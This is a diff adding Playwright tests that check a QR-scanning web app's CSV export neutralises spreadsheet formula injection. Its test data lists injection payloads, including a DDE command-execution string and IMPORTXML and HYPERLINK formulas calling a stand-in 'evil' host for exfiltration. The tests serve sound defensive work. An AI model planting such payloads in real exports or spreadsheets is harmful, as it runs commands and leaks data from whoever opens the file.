@@ -3616,3 +3616,78 @@ test.describe('Scanned text is never treated as markup', () => {
         expect(shown).toBe('Plain <Title> & co');
     });
 });
+
+test.describe('Exported CSV cannot run in a spreadsheet', () => {
+    // Quoting a CSV cell is not enough. Excel, Google Sheets and LibreOffice treat a cell whose
+    // text begins with = + - @ (or a tab or carriage return) as a FORMULA, quotes or not. A
+    // code's data is whatever a scanned QR contained, and export-then-open-in-Excel is the whole
+    // point of the CSV button — so a QR reading `=cmd|'/c calc'!A1` exported cleanly and then
+    // executed when the file was opened. Same shape as the XSS: attacker-controlled text
+    // reaching a context that interprets it.
+    const ATTACKS = [
+        `=cmd|'/c calc'!A1`,
+        '@SUM(1+1)',
+        '+HYPERLINK("http://evil","click")',
+        '-2+3+cmd',
+        '=IMPORTXML("http://evil","//a")',   // silent exfiltration, no visible prompt
+    ];
+
+    const withAttacks = async (page) => {
+        await page.goto('/index.html');
+        await page.waitForFunction(() => window.buildCsv && window.OS_STATE, null, { timeout: 20000 });
+        await page.waitForTimeout(900);
+        await page.evaluate((attacks) => {
+            attacks.forEach((data, i) => window.OS_STATE.apps.push({
+                id: 'inj_' + i, title: 'Scanned ' + i, type: 'grid',
+                page: 0, order: 50 + i, bcid: 'qrcode', data,
+            }));
+        }, ATTACKS);
+    };
+    // Cells are `"..."` separated by `","`; index 1 is the data column.
+    const dataCells = (csv) => csv.split('\n').slice(1).map(r => (r.split('","')[1] || ''));
+
+    test('no exported cell begins as a formula', async ({ page }) => {
+        await withAttacks(page);
+        const cells = dataCells(await page.evaluate(() => window.buildCsv()));
+        const dangerous = cells.filter(c => /^[=+\-@\t\r]/.test(c));
+        expect(dangerous, `these cells would execute on open: ${dangerous.join(' | ')}`).toEqual([]);
+        expect(cells.filter(c => c.startsWith("'")).length,
+               'the attack payloads were not defused').toBe(ATTACKS.length);
+    });
+
+    test('ordinary codes are exported unchanged', async ({ page }) => {
+        // Defusing must not become mangling: a URL or a WiFi string has to survive intact, or
+        // the export is useless for the thing people actually export.
+        await withAttacks(page);
+        const cells = dataCells(await page.evaluate(() => window.buildCsv()));
+        expect(cells).toContain('https://neodrag.dev');
+        expect(cells).toContain('WIFI:S:MyNetwork;T:WPA;P:Password;;');
+        for (const c of cells) {
+            if (!ATTACKS.some(a => c.includes(a.slice(1, 8)))) {
+                expect(c.startsWith("'"), `an ordinary cell was needlessly quoted: ${c}`).toBe(false);
+            }
+        }
+    });
+
+    test('the Library selection export defuses the same way', async ({ page }) => {
+        // Two export paths existed with two separate escapers. One helper now, so a fix to one
+        // cannot miss the other.
+        await withAttacks(page);
+        const r = await page.evaluate(() => ({
+            helper: typeof window.csvCell,
+            attack: window.csvCell("=evil"),
+            plain: window.csvCell('hello'),
+            quotes: window.csvCell('say "hi"'),
+            empty: window.csvCell(null),
+        }));
+        expect(r.helper).toBe('function');
+        expect(r.attack).toBe(`"'=evil"`);
+        expect(r.plain).toBe('"hello"');
+        expect(r.quotes).toBe('"say ""hi"""');
+        expect(r.empty).toBe('""');
+
+        const usesHelper = await page.evaluate(() =>
+            document.documentElement.outerHTML.split('const esc = window.csvCell').length - 1);
+        expect(usesHelper, 'an export path still has its own escaper').toBeGreaterThanOrEqual(2);
+    });
+});
